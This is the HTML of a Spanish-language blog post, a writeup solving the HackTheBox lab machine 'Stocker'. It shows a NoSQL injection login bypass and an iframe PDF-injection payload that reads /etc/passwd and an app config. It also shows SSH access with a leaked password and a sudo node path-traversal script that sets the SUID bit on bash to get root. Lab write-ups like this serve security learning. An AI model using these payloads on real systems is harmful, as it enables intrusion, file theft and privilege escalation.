@@ -1,0 +1,744 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Stocker HackTheBox - Blog      Writeups de HTB      </title>
+<meta name="description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_Arg">
+<meta property="og:site_name" content="Blog | Writeups de HTB">
+<meta property="og:title" content="Stocker HackTheBox">
+<meta property="og:url" content="http://localhost:4000/writeup-stocker/">
+
+
+  <meta property="og:description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-stocker/icono.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-03-12T00:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/writeup-stocker/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "voidnet",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Blog | Writeups de HTB Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/hacking.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Stocker HackTheBox</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/imagen.jpg" alt="VØ1DN3T" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">VØ1DN3T</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Hacker ético, CTFs player<br>Rank de HackTheBox = Hacker
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Argentina</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Voidnet01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Stocker HackTheBox">
+    <meta itemprop="description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+    <meta itemprop="datePublished" content="March 12, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Stocker HackTheBox
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-03-12T00:00:00-03:00">March 12, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p>Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/Stocker.png" alt="" /></p>
+
+<p>Empezamos a escanear para decubrir puertos abiertos en la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.11.196
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-12 21:37 <span class="nt">-03</span>
+Initiating SYN Stealth Scan at 21:37
+Scanning 10.10.11.196 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.11.196
+Discovered open port 80/tcp on 10.10.11.196
+Increasing send delay <span class="k">for </span>10.10.11.196 from 0 to 5 due to max_successful_tryno increase to 4
+Increasing send delay <span class="k">for </span>10.10.11.196 from 5 to 10 due to max_successful_tryno increase to 5
+Completed SYN Stealth Scan at 21:37, 16.48s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.11.196
+Host is up, received user-set <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-03-12 21:37:28 <span class="nt">-03</span> <span class="k">for </span>17s
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+</code></pre></div></div>
+<p>Luego seguimos con el escaneo de puertos para ver que versiones y servicios tiene</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.196
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-12 21:47 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.11.196
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 3d12971d86bc161683608f4f06e6d54e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7c4d1a7868ce1200df491037f9ad174f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 dd978050a5bacd7d55e827ed28fdaa3b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://stocker.htb &lt;<span class="nt">--</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+</code></pre></div></div>
+<p>Vemos que nmap en el puerto 80 nos reportó un dominio, otra forma para descubrir el dominio es tirando de curl</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ curl <span class="nt">-s</span> 10.10.11.196 <span class="nt">-I</span> | <span class="nb">grep </span>Location
+Location: http://stocker.htb
+</code></pre></div></div>
+<p>Ya que tenemos un dominio es tan solo agregarlo en el archivo /etc/hosts</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+127.0.0.1       localhost
+127.0.1.1       voidnet
+10.10.11.196 stocker.htb
+<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+</code></pre></div></div>
+<p>Revisemos la web</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/pagina.png" alt="" /></p>
+
+<p>Ahora que tenemos un dominio intentemos buscar directorios ocultos con gobuster</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://stocker.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 100
+
+<span class="o">===============================================================</span>
+Gobuster v3.5
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://stocker.htb
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 100
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.5
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2023/03/12 22:07:03 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 178] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://stocker.htb/img/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 178] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://stocker.htb/css/]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 178] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://stocker.htb/js/]
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 178] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://stocker.htb/fonts/]
+Progress: 9028 / 220561 <span class="o">(</span>4.09%<span class="o">)</span>^C
+<span class="o">[!]</span> Keyboard interrupt detected, terminating.
+
+<span class="o">===============================================================</span>
+2023/03/12 22:07:20 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>Podemos ver que nos reporto un directorio llamado fonts, veamos con que nos encontramos</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/direc.png" alt="" /></p>
+
+<p>vemos que no hay nada, intentemos buscar subdirectorios</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ gobuster vhost <span class="nt">-u</span> http://stocker.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-t</span> 100 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.5
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:             http://stocker.htb
+<span class="o">[</span>+] Method:          GET
+<span class="o">[</span>+] Threads:         100
+<span class="o">[</span>+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+<span class="o">[</span>+] User Agent:      gobuster/3.5
+<span class="o">[</span>+] Timeout:         10s
+<span class="o">===============================================================</span>
+2023/03/12 22:15:04 Starting gobuster <span class="k">in </span>VHOST enumeration mode
+<span class="o">===============================================================</span>
+Found: dev.stocker.htb <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 28]
+</code></pre></div></div>
+<p>Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s1">'10.10.11.196 dev.stocker.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
+
+</code></pre></div></div>
+<p>Ingresemos a la web</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/pag.png" alt="" /></p>
+
+<p>Podemos ver que tenemos un login, intente bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, despues de muchos intento con 
+BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli</p>
+
+<p>Al interceptar por BurpSuite nos muestra esto</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+POST /login HTTP/1.1
+
+Host: dev.stocker.htb
+
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 29
+
+Origin: http://dev.stocker.htb
+
+Connection: close
+
+Referer: http://dev.stocker.htb/login
+
+Cookie: connect.sid<span class="o">=</span>s%3AeehRhX_wEYQcXzjWxltuGkOJ0T8tYaa_.iO7JxTfBZdxcPOUdjeU3uGBLRc9P4jRifl0bGfz0Jx8
+
+Upgrade-Insecure-Requests: 1
+
+
+<span class="nv">username</span><span class="o">=</span>admin&amp;password<span class="o">=</span>admin
+</code></pre></div></div>
+
+<p>Ahora para hacer el ataque NoSqli tenemos que ejecutar donde esta el apartado username=admin…. con este script</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span> <span class="o">}</span>
+
+</code></pre></div></div>
+<p>Pero antes donde dice content-Type tenemos que poner esto</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>application/json
+</code></pre></div></div>
+<p>Y nos quedaria algo asi</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/burp.png" alt="" /></p>
+
+<p>Finalmente le damos un FORWARD</p>
+
+<p>Miremos la web</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/pagina2.png" alt="" /></p>
+
+<p>Al darle view cart nos muesta esto, es como si fuera una tienda y podemos agregar cosas al carrito para comprar</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/compras.png" alt="" /></p>
+
+<p>Agregamos algo al carrito y le damos View Cart nos muestra esto</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/compras2.png" alt="" /></p>
+
+<p>Le damos a submit y nos muestra como un identificador y un enlace en HERE</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/compras3.png" alt="" /></p>
+
+<p>Si le damos a HERE nos redirige a /api/po/ y al identificador que nos termina mostrando un pdf</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/pdf.png" alt="" /></p>
+
+<p>Volvemos a interceptar con Burp y le damos submit</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/submit.png" alt="" /></p>
+
+<p>Vemos una estructura en json</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/json.png" alt="" /></p>
+
+<p>En el apartado title podemos modificar  y pasarle una estructura que tenga un archivo un ejemplo es el /etc/passwd</p>
+
+<h2 id="codigo">Codigo</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe <span class="nv">src</span><span class="o">=</span>file:///etc/passwd <span class="nv">height</span><span class="o">=</span>750px <span class="nv">width</span><span class="o">=</span>750px&gt;&lt;/iframe&gt;
+
+</code></pre></div></div>
+<p>Miramos en el repeater que a la derecha luego de ejecutar el codigo nos muestra una id</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/id.png" alt="" /></p>
+
+<p>Copiamos ese id y lo pegamos donde esta el pdf para que nos muestre el /etc/passwd</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/pdf2.png" alt="" /></p>
+
+<p>Si prestamos atencion al archivo podemos ver que hay un usuario que se llama angoose</p>
+
+<p>Puedo pensas que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración valido</p>
+
+<p>Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf</p>
+
+<pre><code class="language-Bash">"&lt;iframe src=file:///var/www/dev/index.js height=800px width=800px&gt;&lt;/iframe&gt;"
+
+</code></pre>
+<p>Deberiamos ver el index.js en el pdf claramente</p>
+
+<p><img src="/assets/images/htb-writeup-stocker/burpsuite.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-stocker/id2.png" alt="" /></p>
+
+<p>Donde marque, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobra esa contraseña para poder conectarnos 
+con ssh con el usuario angoose</p>
+
+<p>Nos conectamos por ssh</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ ssh angoose@10.10.11.196
+The authenticity of host <span class="s1">'10.10.11.196 (10.10.11.196)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.11.196<span class="s1">' (ED25519) to the list of known hosts.
+angoose@10.10.11.196'</span>s password: IHeardPassphrasesArePrettySecure 
+Last login: Sun Mar 12 23:53:34 2023 from 10.10.16.39
+angoose@stocker:~<span class="err">$</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>angoose@stocker:~<span class="nv">$ </span>ifconfig
+eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
+        ether 00:50:56:b9:d8:2d  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 585090  bytes 75834889 <span class="o">(</span>75.8 MB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 592998  bytes 176522802 <span class="o">(</span>176.5 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
+        RX packets 23722  bytes 4015190 <span class="o">(</span>4.0 MB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 23722  bytes 4015190 <span class="o">(</span>4.0 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+angoose@stocker:~<span class="err">$</span>
+</code></pre></div></div>
+<p>Hacemos ls y ya podemos ver la primera flag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+angoose@stocker:~<span class="nv">$ </span><span class="nb">ls
+</span>flag.js  user.txt
+angoose@stocker:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+ca4<span class="k">*************************</span>7d
+angoose@stocker:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="escala-de-privilegios">Escala de privilegios</h2>
+
+<p>Si hacemos sudo -l vemos que podemos ejecutar cualquier js con node</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+angoose@stocker:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>angoose: IHeardPassphrasesArePrettySecure 
+Matching Defaults entries <span class="k">for </span>angoose on stocker:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User angoose may run the following commands on stocker:
+    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/node /usr/local/scripts/<span class="k">*</span>.js
+angoose@stocker:~<span class="nv">$ </span>
+
+</code></pre></div></div>
+
+<p>Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hara un directory path traversal</p>
+
+<h2 id="codigo-js">Codigo js</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require('child_process').exec('chmod u+s /bin/bash')
+</code></pre></div></div>
+<p>Ahora ejecutamos el script de js y al hacer bash -p tendremos privilegio como root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>angoose@stocker:~<span class="nv">$ </span><span class="nb">sudo </span>node /usr/local/scripts/../../../home/angoose/setensa.js
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>angoose: IHeardPassphrasesArePrettySecure 
+angoose@stocker:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
+angoose@stocker:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">cd</span> /root
+bash-5.0# <span class="nb">ls
+</span>root.txt
+bash-5.0# <span class="nb">cat </span>root.txt
+26<span class="k">*****************************</span>9
+bash-5.0# 
+</code></pre></div></div>
+<p>Y obtenemos la segunda flag</p>
+
+<p>Espero que les haya gustado mi primer writeup y que se haya entendido</p>
+
+<p>Gracias por leer :D.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hacking-web" class="page__taxonomy-item" rel="tag">Hacking web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentesting" class="page__taxonomy-item" rel="tag">pentesting</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentesting" class="page__taxonomy-item" rel="tag">pentesting</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-03-12T00:00:00-03:00">March 12, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 voidnet</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
